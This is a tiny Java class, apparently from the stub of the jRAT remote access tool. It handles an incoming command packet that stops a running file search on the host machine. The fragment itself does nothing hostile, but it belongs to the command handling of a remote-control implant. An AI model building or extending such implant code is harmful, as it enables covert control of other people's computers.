package io.jrat.stub.packets.incoming;

import io.jrat.stub.FileSearch;

public class Packet54StopSearch extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		FileSearch.running = false;
	}

}
